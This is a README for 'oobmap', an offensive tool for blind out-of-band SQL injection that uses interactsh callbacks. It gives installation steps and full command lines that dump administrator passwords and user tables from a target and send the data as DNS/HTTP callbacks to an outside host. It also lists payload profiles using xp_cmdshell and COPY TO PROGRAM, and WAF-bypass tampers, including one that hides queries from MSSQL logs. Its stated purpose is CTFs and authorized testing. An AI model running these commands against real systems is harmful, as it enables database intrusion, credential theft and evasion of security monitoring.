# oobmap

`oobmap` is a command-line tool for exploiting **blind out-of-band injection**
in CTFs and authorized labs.

It uses an OAST service such as **interactsh** as the signal source. Instead of
checking whether a page contains a word like `Welcome back`, `oobmap` watches for
DNS/HTTP callbacks and uses those callbacks to recover data.

Typical use cases:

- blind SQL injection where the database can trigger DNS or HTTP requests;
- MSSQL `xp_dirtree` / UNC-based DNS callbacks;
- Oracle `UTL_HTTP` callbacks;
- PostgreSQL `COPY TO PROGRAM` callbacks when privileges allow it;
- MySQL `LOAD_FILE()` UNC callbacks on suitable Windows targets.

`oobmap` is not a full sqlmap replacement. It is a focused OOB extractor for
cases where the useful signal happens outside the HTTP response.

## Requirements

- Python 3.10+
- `interactsh-client`
- Permission to test the target

Install `interactsh-client` with Go:

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
export PATH="$PATH:$HOME/go/bin"
```

## Installation

### Option 1: pipx

Recommended for most users:

```bash
pipx install git+https://github.com/Charlot-DEDJINOU/oobmap.git
```

Then:

```bash
oobmap --help
```

### Option 2: pip

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install git+https://github.com/Charlot-DEDJINOU/oobmap.git
oobmap --help
```

### Option 3: from source

Clone the repository:

```bash
git clone https://github.com/Charlot-DEDJINOU/oobmap.git
cd oobmap
```

Install it in editable mode:

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install -e .
oobmap --help
```

You can also run it directly without installation:

```bash
python3 oobmap.py --help
```

Or create a shell alias:

```bash
alias oobmap='python3 /absolute/path/to/oobmap/oobmap.py'
```

The project currently uses only the Python standard library at runtime.

## Quick Start

Start interactsh and save JSONL events:

```bash
interactsh-client -json -o interactsh.jsonl
```

Copy the payload domain that interactsh prints:

```text
abc123.oast.site
```

Capture a request in Burp Suite or ZAP and save it as `req.txt`.

Example request:

```http
GET / HTTP/1.1
Host: target.example
Cookie: TrackingId=abc123; session=xyz
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

First, verify that conditional OOB callbacks work:

```bash
oobmap --check \
  -r req.txt \
  --dbms mssql \
  --domain abc123.oast.site \
  --log interactsh.jsonl \
  --level 2 \
  --first
```

Without `-p`, `--check` scans injection points according to `--level`.
At `--level 2`, it tests query parameters, form body parameters, and cookies.
When a point is confirmed, `oobmap` prints the exact `--place ... -p ...` pair
to reuse for extraction. `--check` is also the default action when no
`--expr`/`--dump`/enum flag is given, so it can be omitted — pass it
explicitly when you want the intent to be obvious in a saved command.

If the check succeeds, extract a scalar expression:

```bash
oobmap \
  -r req.txt \
  -p TrackingId \
  --dbms mssql \
  --domain abc123.oast.site \
  --log interactsh.jsonl \
  --expr "SELECT password FROM users WHERE username='administrator'"
```

For hex-like secrets, restrict the alphabet to make extraction faster:

```bash
oobmap \
  -r req.txt \
  -p TrackingId \
  --dbms mssql \
  --domain abc123.oast.site \
  --log interactsh.jsonl \
  --expr "SELECT password FROM users WHERE username='administrator'" \
  --alphabet 0123456789abcdef \
  --max-len 40
```

## Commands

List payload profiles:

```bash
oobmap profiles
```

Check whether the target gives conditional callbacks. This can target one known
parameter:

```bash
oobmap --check -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl
```

Or scan several locations:

```bash
oobmap --check -r req.txt --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --level 3 --first
```

Extract an arbitrary scalar SQL expression:

```bash
oobmap -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --expr "SELECT DB_NAME()"
```

Extract common metadata:

```bash
oobmap -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --banner --current-user --current-db
```

Enumerate tables:

```bash
oobmap -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --tables --limit 20
```

Enumerate columns for one table:

```bash
oobmap -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --columns -T users --limit 20
```

Dump rows from a table:

```bash
oobmap --dump -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  -T users -C username,password --limit 20
```

If you omit `-C`, `oobmap` enumerates the columns first and then dumps them:

```bash
oobmap --dump -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  -T users --limit 20
```

Dump with a filter:

```bash
oobmap --dump -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  -T users -C username,password --where "username='administrator'" --limit 1
```

Use `-D` when the DBMS needs a database/schema/catalog:

```bash
oobmap --dump -r req.txt -p TrackingId --dbms postgres-program \
  --domain abc123.oast.site --log interactsh.jsonl \
  -D public -T users -C username,password
```

## Injection Points

By default, `oobmap` searches for `-p <name>` in cookies, query string, form
body, and headers.

For automatic checks, `--level` controls where it looks:

| Level | Locations |
|---|---|
| `1` | Query string and URL-encoded form body |
| `2` | Level 1 + cookies |
| `3` | Level 2 + common headers such as `User-Agent`, `Referer`, `X-Forwarded-For` |
| `5` | Level 3 + most remaining headers |

`--risk` controls how many payload variants are tried *within* the selected
profile (default `2`, matching the historical fixed set). `--risk 1` sends a
single, minimal-noise variant; `--risk 3` adds extra comment-terminator
variants for targets that reject the default set. `--risk` never changes the
DBMS/profile, never disables `--validate`, and never enables stacked-query,
`xp_cmdshell`, or `dblink` behavior — pick `--dbms mysql-stacked`,
`--dbms mssql-cmdshell`, or `--dbms postgres-dblink` explicitly for that.

Force a location:

```bash
--place cookie
--place query
--place body
--place header
```

You can also mark the exact injection point with `*`:

```http
GET /search?q=test* HTTP/1.1
Host: target.example
```

Then run:

```bash
oobmap -r req.txt -p ignored --place marker --expr "SELECT DB_NAME()" ...
```

For HTTPS targets saved as raw HTTP requests, add:

```bash
--force-ssl
```

## Sessions and Resume

`oobmap` keeps a per-target session by default, similar in spirit to sqlmap.
Session files are stored under:

```text
~/.local/share/oobmap/output/<target>/session.sqlite
```

During extraction, every recovered prefix is saved. If a run is interrupted,
running the same command again resumes from the next character:

```bash
oobmap -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --expr "SELECT password FROM users WHERE username='administrator'"
```

Useful options:

```bash
--output-dir DIR     # store sessions somewhere else
--flush-session     # delete the current target session before running
--fresh-queries     # ignore cached extraction/catalog/check values but keep other session data
```

`--dump` validates the target table and columns against the current session/catalog.
If they are missing from the session, `oobmap` enumerates them first. This means:

```bash
oobmap --dump ... -T users
```

will first discover the columns for `users`, then dump all discovered columns.
To skip validation and go straight to the query, provide `-C` and use:

```bash
--no-validate
```

Examples:

```bash
oobmap ... --expr "SELECT DB_NAME()" --output-dir ./oobmap-output
oobmap ... --expr "SELECT DB_NAME()" --flush-session
oobmap ... --expr "SELECT DB_NAME()" --fresh-queries
```

`--check` also reads through the session cache: re-running `--check`
against the same target/dbms/place/param (or the same scan) reuses the
previously recorded outcome — `confirmed`, `conditional-failed`, or
`not-confirmed` — instead of re-sending OOB probes, and prints
`Using cached check result: <status>` so it's clear the value came from
cache. Use `--fresh-queries` to force a fresh probe.

## Payload Profiles

Current profiles:

| Profile | Purpose | Notes |
|---|---|---|
| `mssql` | MSSQL stacked query via `xp_dirtree` | Requires stacked queries and access to `xp_dirtree`. |
| `mssql-cmdshell` | MSSQL `xp_cmdshell` nslookup callback | Alternative when `xp_dirtree` is blocked; requires `xp_cmdshell` enabled. |
| `mysql` | MySQL `LOAD_FILE('\\\\host\\x')` | Usually depends on Windows/UNC behavior and file privileges. |
| `mysql-stacked` | MySQL `LOAD_FILE` via stacked query | For multi-statement enabled targets; requires FILE privilege. |
| `oracle-http` | Oracle `UTL_HTTP.REQUEST()` | Requires network ACL/package access. |
| `oracle-dns` | Oracle `UTL_INADDR.GET_HOST_ADDRESS()` | DNS-only — no `UTL_HTTP`/HTTP ACL needed; useful when HTTP egress is blocked but DNS resolution is allowed. |
| `postgres-program` | PostgreSQL `COPY ... TO PROGRAM` | Requires high privileges such as superuser or `pg_execute_server_program`. |
| `postgres-dblink` | PostgreSQL `dblink` extension callback | Lower privilege than `COPY TO PROGRAM`; no superuser needed in most default installs. |
| `sqlite-http` | SQLite `http_get()` callback via sqlite-http/sqlean-http | Requires the SQLite HTTP extension to be loaded. |

Profiles are explicit on purpose. OOB exploitation depends heavily on the DBMS,
available privileges, network egress, and stacked-query support.

Metadata enumeration uses DBMS-specific catalog queries:

- MSSQL: `INFORMATION_SCHEMA.TABLES`, `INFORMATION_SCHEMA.COLUMNS`
- MySQL: `information_schema.tables`, `information_schema.columns`
- PostgreSQL: `information_schema.tables`, `information_schema.columns`
- Oracle: `all_tables`, `all_tab_columns`
- SQLite HTTP profile: `sqlite_master` for table names

## WAF Bypass / Tampers

`oobmap` can rewrite generated payloads through a chain of tamper scripts,
similar in spirit to sqlmap's `--tamper`. Tampers are opt-in and explicit —
`oobmap` never applies one without you naming it.

List available tampers:

```bash
oobmap tampers
```

Current tampers:

| Tamper | Effect |
|---|---|
| `inline-comments` | Replace spaces with `/**/` |
| `randomize-case` | Randomly capitalize SQL keywords |
| `between-comments` | Split keywords mid-word: `SEL/**/ECT` |
| `hex-encode-strings` | Convert `'string'` literals to `0x` hex |
| `double-url-encode` | Double URL-encode the full payload |
| `url-encode` | URL-encode the full payload once |
| `space2randomblank` | Replace spaces with a random whitespace character (tab/newline/etc.) |
| `if2case` | Rewrite `IF(cond,then,else)` as `CASE WHEN (cond) THEN (then) ELSE (else) END` |
| `ord2ascii` | Replace `ORD()` calls with `ASCII()` (MySQL) |
| `sp_password` | Append `sp_password` to hide the query from MSSQL logs |
| `apostrophemask` | Replace `'` with its UTF-8 fullwidth equivalent |
| `apostrophenullencode` | Replace `'` with the illegal double-encoding `%00%27` |
| `appendnullbyte` | Append a `%00` null byte to the end of the payload |
| `base64encode` | Base64-encode the entire payload |
| `charunicodeencode` | Unicode-URL-encode every character as `%uXXXX` |
| `charunicodeescape` | Unicode-escape every character as `\uXXXX` |
| `decentities` | HTML decimal-encode every character: `&#NN;` |
| `hexentities` | HTML hex-encode every character: `&#xHH;` |
| `htmlencode` | HTML decimal-encode non-alphanumeric characters |
| `overlongutf8` | Overlong-UTF8-encode non-alphanumeric characters |
| `overlongutf8more` | Overlong-UTF8-encode every character |
| `percentage` | Prefix every character with a literal `%` |
| `unmagicquotes` | Replace `'` with `%bf%27` and append `--` to neutralize residue |
| `escapequotes` | Backslash-escape `'` and `"` |
| `hex2char` | Rewrite `0x<hex>` literals as `CONCAT(CHAR(...),...)` |
| `bluecoat` | Replace the space after a keyword with a random blank, then `=` with ` LIKE ` |
| `commentbeforeparentheses` | Prepend `/**/` before every `(` |
| `multiplespaces` | Wrap `AND`/`OR`/`SELECT`/`WHERE`/`UNION` with extra spaces |
| `space2dash` | Replace spaces with `--` plus a random string and newline |
| `space2hash` | Replace spaces with `#` plus a random string and newline (MySQL) |
| `space2morecomment` | Replace spaces with `/**_**/` (MySQL) |
| `space2morehash` | Replace spaces with `#` plus a longer random string and newline (MySQL) |
| `space2mssqlblank` | Replace spaces with a random blank token (`%09`/`%0a`/`%0b`/`%0c`/`%0d`) |
| `space2mssqlhash` | Replace spaces with `#` plus a newline |
| `space2mysqlblank` | Replace spaces with a random blank token (MySQL) |
| `space2mysqldash` | Replace spaces with `--` plus a newline (MySQL) |
| `space2plus` | Replace spaces with `+` |
| `versionedkeywords` | Wrap `SELECT`/`FROM`/`WHERE`/`AND`/`OR`/`UNION` individually in `/*! ... */` (MySQL) |
| `versionedmorekeywords` | Wrap a broader keyword set individually in `/*! ... */` (MySQL) |
| `halfversionedmorekeywords` | Prepend `/*!` before each keyword, close once at the end (MySQL) |
| `modsecurityversioned` | Wrap the whole payload in `/*! ... */` (MySQL) |
| `modsecurityzeroversioned` | Wrap the whole payload in `/*!00000 ... */` (MySQL) |
| `randomcomments` | Insert `/**/` at a random position within common keywords |
| `lowercase` | Lowercase common SQL keywords |
| `uppercase` | Uppercase common SQL keywords |
| `luanginx` | Append trailing padding to bypass Lua-Nginx/Cloudflare body-size WAF checks |
| `luanginxmore` | Same as `luanginx` with larger padding |
| `between` | Rewrite `X>N` as `X NOT BETWEEN 0 AND N`, `X=N` as `X BETWEEN N AND N` |
| `equaltolike` | Replace `=` with `LIKE` |
| `equaltorlike` | Replace `=` with `RLIKE` (MySQL) |
| `greatest` | Rewrite `A>B` as `GREATEST(A,B)<>B` |
| `least` | Rewrite `A<B` as `LEAST(A,B)<>B` |
| `symboliclogical` | Replace `AND`/`OR` with `&&` / `\|\|` |
| `plus2concat` | Rewrite `A+B` as `CONCAT(A,B)` |
| `plus2fnconcat` | Rewrite `A+B` as the ODBC `{fn CONCAT(A,B)}` form |
| `binary` | Prepend `BINARY` before every quoted string (MySQL) |
| `scientific` | Rewrite integer literals in scientific notation (`N` -> `Ne0`) |

Chain multiple tampers with a comma-separated list, applied in order:

```bash
oobmap -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --expr "SELECT DB_NAME()" \
  --tamper inline-comments,randomize-case
```

### Compatibility warnings

Some tampers only produce valid syntax for specific DBMS dialects.
`hex-encode-strings` rewrites `'string'` literals into bare `0x<hex>`
literals — valid in MySQL and MSSQL, but a syntax error in PostgreSQL,
SQLite, and Oracle. When you combine `--tamper hex-encode-strings` with an
incompatible `--dbms` profile, `oobmap` prints a warning and still runs —
it stays your call whether to proceed:

```text
[WARNING] tamper 'hex-encode-strings' emits bare 0x<hex> literals, valid only
          in MySQL/MSSQL — likely to break query syntax for --dbms postgres-program.
```

`sp_password` only has an effect against MSSQL (its log-redaction trick is
MSSQL-specific) — it's a harmless no-op elsewhere, so `oobmap` warns rather
than blocking:

```text
[WARNING] tamper 'sp_password' only hides queries from MSSQL logs — has no
          effect for --dbms mysql.
```

The 5 versioned-comment tampers (`versionedkeywords`, `versionedmorekeywords`,
`halfversionedmorekeywords`, `modsecurityversioned`, `modsecurityzeroversioned`)
rely on MySQL's `/*! ... */` executable-comment syntax — on every other engine
`/* ... */` is a standard comment, so the wrapped keyword is silently stripped:

```text
[WARNING] tamper 'versionedkeywords' relies on MySQL's /*! ... */ executable-comment
          syntax — the wrapped keyword is silently stripped as a plain comment for
          --dbms postgres-program, likely to break query syntax.
```

`equaltorlike` and `binary` emit MySQL-specific syntax (`RLIKE`, the
`BINARY` keyword); `plus2concat`/`plus2fnconcat` emit `CONCAT()` calls,
which SQLite doesn't support (SQLite has no `CONCAT()` function, only the
`||` operator) — both combinations print a warning and still run.

## How Extraction Works

For every character position, `oobmap` sends the whole alphabet in a batch.
Each candidate gets a unique callback token:

```text
<run-id>-p01-c73.abc123.oast.site
```

If interactsh receives that callback, `oobmap` decodes:

```text
p01 = position 1
c73 = ASCII hex 0x73 = s
```

Then it appends `s` to the result and moves to the next position.

This avoids the slow pattern of waiting after every single character.

## Example Workflow

1. Capture a request as `req.txt`.
2. Start interactsh:

   ```bash
   interactsh-client -json -o interactsh.jsonl
   ```

3. Confirm OOB:

   ```bash
   oobmap --check -r req.txt --dbms mssql \
     --domain abc123.oast.site --log interactsh.jsonl \
     --level 2 --first
   ```

4. Reuse the confirmed injection point:

   ```bash
   oobmap -r req.txt --place cookie -p TrackingId --dbms mssql \
     --domain abc123.oast.site --log interactsh.jsonl \
     --expr "SELECT password FROM users WHERE username='administrator'"
   ```

5. Watch progress:

   ```text
   [+] pos 01: s -> s
   [+] pos 02: q -> sq
   [+] pos 03: l -> sql
   ```

## Limitations

`oobmap` needs a real OOB primitive. If the database cannot trigger DNS/HTTP
requests, use boolean/time/error-based extraction instead.

Common blockers:

- outbound DNS/HTTP is blocked;
- stacked queries are not supported;
- the DBMS function is disabled;
- the database user lacks privileges;
- DNS caching delays callbacks;
- the chosen alphabet does not contain the secret character.

When in doubt, start with `oobmap --check`.

## Current Scope

The goal is to behave like a sqlmap-style workflow for OOB exploitation, but
`oobmap` is not yet a full SQL injection framework.

Implemented:

- OOB check against a known injection point;
- OOB scan of likely injection points with `--level`;
- scalar extraction with `extract`;
- `dump` helper for one table/column expression;
- metadata extraction with `enum --banner --current-user --current-db`;
- table and column enumeration with `enum --tables` and `enum --columns -T <table>`;
- multi-row, multi-column dump with `dump -T <table> -C col1,col2 --limit N`;
- table/column validation before dump, with auto column enumeration when `-C` is omitted;
- automatic resume with `session.sqlite`;
- `--output-dir`, `--flush-session`, `--fresh-queries`;
- `--force-ssl`, `--batch`, `--risk`, and `--verbose` style options.

Not implemented yet:

- full `--dbs` enumeration and multi-schema selection;
- CSV/JSON dump output files;
- DBMS fingerprinting;
- boolean/time/error/UNION exploitation;
- advanced persistent run cache UI.

## Safety

Use this only on systems you own, CTF infrastructure, training labs, or targets
where you have explicit permission. OOB payloads can generate external network
traffic from the target.

## Development

Run tests:

```bash
PYTHONPATH=. python3 -m unittest discover -s tests -v
```

Run syntax checks:

```bash
python3 -m py_compile oobmap.py oobmap/*.py
```
